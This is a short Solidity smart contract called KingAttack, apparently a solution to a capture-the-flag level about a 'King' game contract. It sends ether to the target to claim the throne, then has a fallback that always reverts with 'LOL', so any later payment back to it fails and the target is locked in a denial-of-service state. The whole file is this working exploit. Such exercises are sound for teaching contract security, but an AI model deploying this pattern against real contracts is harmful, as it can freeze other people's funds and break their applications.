//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract KingAttack {
    constructor(address _king) public payable {
        address(_king).call{value: msg.value}("");
    }

    fallback() external payable {
        revert("LOL");
    }
}